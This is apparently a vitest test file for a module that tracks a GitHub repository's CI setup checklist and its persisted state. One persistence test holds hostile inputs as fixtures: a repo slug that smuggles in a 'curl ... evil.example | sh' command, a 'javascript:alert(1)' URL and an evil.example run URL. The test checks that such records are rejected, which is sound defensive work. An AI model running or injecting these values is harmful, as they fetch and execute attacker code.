import { mkdtemp, readdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { beforeEach, describe, expect, test } from 'vitest';
import { deriveFactoryState, newFactoryRecord, readFactoryRecord, refreshFactory, updateFactoryRecord, writeFactoryRecord, type FactoryRecord } from './factory-checklist.js';
import { factoryPlanTargets, type FactoryExec, type FactoryPlan } from './enable-factory.js';
import { tmpRepo } from './test-kit.js';

const plan: FactoryPlan = {
  provider: 'github',
  repoSlug: 'acme/widgets',
  defaultBranch: 'main',
  login: 'octocat',
  packageManager: 'pnpm',
  scripts: { typecheck: true, lint: true, test: true, build: true },
  ...factoryPlanTargets(),
};
const PR = 'https://github.com/acme/widgets/pull/7';
// The record lives in the hub config dir, not in the repo.
beforeEach(async () => {
  process.env.VANGUARD_HUB_CONFIG_DIR = await mkdtemp(join(tmpdir(), 'factory-cfg-'));
});

const statuses = (r: FactoryRecord | null): string => deriveFactoryState(r).steps.map((s) => `${s.id}:${s.status}`).join(' ');

describe('deriveFactoryState', () => {
  test('no record is "none"', () => {
    expect(deriveFactoryState(null)).toMatchObject({ state: 'none' });
  });

  test('walks pr -> secret -> merged -> doctor', () => {
    const rec: FactoryRecord = { plan, prUrl: PR, secretSet: false, merged: false };
    expect(statuses(rec)).toBe('pr:done secret:current merged:pending doctor:pending');
    expect(deriveFactoryState(rec)).toMatchObject({ state: 'setting-up', step: 'secret', prUrl: PR });
    expect(deriveFactoryState({ ...rec, secretSet: true })).toMatchObject({ state: 'setting-up', step: 'merged' });
    const merged = { ...rec, secretSet: true, merged: true };
    expect(deriveFactoryState(merged)).toMatchObject({ state: 'setting-up', step: 'doctor' });
    const running = { ...merged, doctor: { url: 'u', status: 'in_progress', conclusion: '' } };
    expect(deriveFactoryState(running)).toMatchObject({ state: 'setting-up', step: 'doctor' });
    const passed = { ...merged, doctor: { url: 'u', status: 'completed', conclusion: 'success' } };
    expect(deriveFactoryState(passed)).toMatchObject({ state: 'ready' });
    expect(statuses(passed)).toBe('pr:done secret:done merged:done doctor:done');
  });

  test('a failed doctor run and a closed PR are broken, with the reason', () => {
    const failed = deriveFactoryState({ plan, prUrl: PR, secretSet: true, merged: true, doctor: { url: 'u', status: 'completed', conclusion: 'failure' } });
    expect(failed).toMatchObject({ state: 'broken', step: 'doctor', reason: 'the doctor run failure' });
    const closed = deriveFactoryState({ plan, prUrl: PR, prClosed: true, secretSet: false, merged: false });
    expect(closed).toMatchObject({ state: 'broken', step: 'merged', reason: 'the callers PR was closed without merging' });
  });

  test('callers already on the base need no PR', () => {
    const rec = newFactoryRecord({ ...plan, existingCallerFiles: plan.callerFiles });
    expect(rec.merged).toBe(true);
    expect(statuses(rec)).toBe('pr:done secret:current merged:done doctor:pending');
  });

  test('a passing doctor proves the secret (org-level or App secrets are invisible to gh secret list)', () => {
    const rec: FactoryRecord = { plan, prUrl: PR, secretSet: false, merged: true, doctor: { url: 'u', status: 'completed', conclusion: 'success' } };
    expect(deriveFactoryState(rec)).toMatchObject({ state: 'ready' });
  });

  test('a dispatched doctor with no listed run yet is pending', () => {
    expect(deriveFactoryState({ plan, prUrl: PR, secretSet: true, merged: true, doctorDispatchedAt: 'x' })).toMatchObject({ doctorPending: true });
  });

  test('the secret step carries the command, never a value', () => {
    expect(deriveFactoryState({ plan, secretSet: false, merged: false }).secret).toEqual({
      secretName: 'CLAUDE_CODE_OAUTH_TOKEN',
      command: 'gh secret set CLAUDE_CODE_OAUTH_TOKEN --repo acme/widgets',
    });
  });
});

describe('persistence', () => {
  test('a record survives a re-read (hub restart)', async () => {
    const repo = await tmpRepo();
    expect(await readFactoryRecord(repo)).toBeNull();
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: true, merged: false });
    expect(await readFactoryRecord(repo)).toEqual({ plan, prUrl: PR, secretSet: true, merged: false });
  });

  test('updateFactoryRecord creates from the plan, then modifies', async () => {
    const repo = await tmpRepo();
    await updateFactoryRecord(repo, plan, (r) => ({ ...r, prUrl: PR }));
    await updateFactoryRecord(repo, plan, (r) => ({ ...r, secretSet: true }));
    expect(await readFactoryRecord(repo)).toMatchObject({ prUrl: PR, secretSet: true, merged: false });
  });

  const onlyFile = async (): Promise<string> => {
    const dir = join(process.env.VANGUARD_HUB_CONFIG_DIR!, 'factory');
    return join(dir, (await readdir(dir))[0]!);
  };

  test('a corrupt file reads as never started', async () => {
    const repo = await tmpRepo();
    await writeFactoryRecord(repo, { plan, secretSet: false, merged: false });
    await writeFile(await onlyFile(), '{nope');
    expect(await readFactoryRecord(repo)).toBeNull();
  });

  test('nothing is written into the repo, and a record with a hostile slug or url is rejected', async () => {
    const repo = await tmpRepo();
    await writeFactoryRecord(repo, { plan, secretSet: false, merged: false });
    expect(await readdir(repo)).not.toContain('.taskcell');
    const bad: Array<Partial<FactoryRecord>> = [
      { plan: { ...plan, repoSlug: 'attacker/sink; curl https://evil.example/x | sh #' } },
      { prUrl: 'javascript:alert(1)' },
      { doctor: { url: 'https://evil.example/runs/1', status: 'queued', conclusion: '' } },
    ];
    for (const patch of bad) {
      await writeFile(await onlyFile(), JSON.stringify({ plan, secretSet: false, merged: false, ...patch }));
      expect(await readFactoryRecord(repo)).toBeNull();
    }
  });

  test('concurrent updates are serialised, none lost', async () => {
    const repo = await tmpRepo();
    await Promise.all([
      updateFactoryRecord(repo, plan, (r) => ({ ...r, prUrl: PR })),
      updateFactoryRecord(repo, plan, (r) => ({ ...r, secretSet: true })),
      updateFactoryRecord(repo, plan, (r) => ({ ...r, merged: true })),
    ]);
    expect(await readFactoryRecord(repo)).toMatchObject({ prUrl: PR, secretSet: true, merged: true });
  });
});

describe('refreshFactory', () => {
  function fakeExec(answers: { secrets?: string[]; pr?: string; runs?: object[] }): { exec: FactoryExec; calls: string[][] } {
    const calls: string[][] = [];
    const exec: FactoryExec = async (file, args) => {
      calls.push([file, ...args]);
      if (args[0] === 'secret') return { stdout: JSON.stringify((answers.secrets ?? []).map((name) => ({ name }))), stderr: '' };
      if (args[0] === 'pr') return { stdout: JSON.stringify({ state: answers.pr ?? 'OPEN' }), stderr: '' };
      return { stdout: JSON.stringify(answers.runs ?? []), stderr: '' };
    };
    return { exec, calls };
  }

  test('detects the secret by name and the merged PR, and persists both', async () => {
    const repo = await tmpRepo();
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: false, merged: false });
    const { exec, calls } = fakeExec({ secrets: ['OTHER', 'CLAUDE_CODE_OAUTH_TOKEN'], pr: 'MERGED' });
    const state = await refreshFactory(repo, { exec });
    expect(state).toMatchObject({ state: 'setting-up', step: 'doctor' });
    expect(calls).toContainEqual(['gh', 'secret', 'list', '--repo', 'acme/widgets', '--json', 'name']);
    expect(calls).toContainEqual(['gh', 'pr', 'view', PR, '--json', 'state']);
    expect(await readFactoryRecord(repo)).toMatchObject({ secretSet: true, merged: true });
  });

  test('keeps waiting while the secret is missing and the PR open; flags a closed PR', async () => {
    const repo = await tmpRepo();
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: false, merged: false });
    expect(await refreshFactory(repo, { exec: fakeExec({ pr: 'OPEN' }).exec })).toMatchObject({ state: 'setting-up', step: 'secret' });
    expect(await refreshFactory(repo, { exec: fakeExec({ pr: 'CLOSED' }).exec })).toMatchObject({ state: 'broken', step: 'merged' });
  });

  test('a failing gh call leaves the checklist as it was', async () => {
    const repo = await tmpRepo();
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: true, merged: false });
    const exec: FactoryExec = async () => {
      throw new Error('offline');
    };
    expect(await refreshFactory(repo, { exec })).toMatchObject({ state: 'setting-up', step: 'merged' });
  });

  test('follows the doctor run live until it completes', async () => {
    const repo = await tmpRepo();
    const url = 'https://github.com/acme/widgets/actions/runs/9';
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: true, merged: true, doctor: { url, status: 'queued', conclusion: '' } });
    const run = (status: string, conclusion: string) => ({ databaseId: 9, status, conclusion, displayTitle: 't', headBranch: 'main', workflowName: 'Taskcell Doctor', createdAt: '', event: 'workflow_dispatch', url });
    const live = await refreshFactory(repo, { exec: fakeExec({ runs: [run('in_progress', '')] }).exec });
    expect(live).toMatchObject({ state: 'setting-up', step: 'doctor', doctor: { status: 'in_progress' } });
    const done = await refreshFactory(repo, { exec: fakeExec({ runs: [run('completed', 'success')] }).exec });
    expect(done).toMatchObject({ state: 'ready', doctor: { url, conclusion: 'success' } });
  });

  test('picks up a dispatched doctor run that was not listed yet', async () => {
    const repo = await tmpRepo();
    const url = 'https://github.com/acme/widgets/actions/runs/11';
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: true, merged: true, doctorDispatchedAt: new Date().toISOString() });
    const mk = (id: number, event: string, createdAt: string) => ({ databaseId: id, status: 'queued', conclusion: '', displayTitle: 't', headBranch: 'main', workflowName: 'Taskcell Doctor', createdAt, event, url: url.replace('11', String(id)) });
    const old = mk(5, 'workflow_dispatch', '2020-01-01T00:00:00Z');
    const fresh = mk(11, 'workflow_dispatch', new Date().toISOString());
    const state = await refreshFactory(repo, { exec: fakeExec({ runs: [old, fresh] }).exec });
    expect(state).toMatchObject({ doctor: { url, status: 'queued' } });
    expect(state.doctorPending).toBeUndefined();
  });

  test('a doctor run that fell out of the run list is read by id', async () => {
    const repo = await tmpRepo();
    const url = 'https://github.com/acme/widgets/actions/runs/9';
    await writeFactoryRecord(repo, { plan, prUrl: PR, secretSet: true, merged: true, doctor: { url, status: 'in_progress', conclusion: '' } });
    const calls: string[][] = [];
    const exec: FactoryExec = async (file, args) => {
      calls.push([file, ...args]);
      return { stdout: args[1] === 'view' ? JSON.stringify({ status: 'completed', conclusion: 'success' }) : '[]', stderr: '' };
    };
    expect(await refreshFactory(repo, { exec })).toMatchObject({ state: 'ready' });
    expect(calls).toContainEqual(['gh', 'run', 'view', '9', '--json', 'status,conclusion']);
  });

  test('never started: nothing to refresh', async () => {
    const repo = await tmpRepo();
    const { exec, calls } = fakeExec({});
    expect(await refreshFactory(repo, { exec })).toMatchObject({ state: 'none' });
    expect(calls).toEqual([]);
  });
});
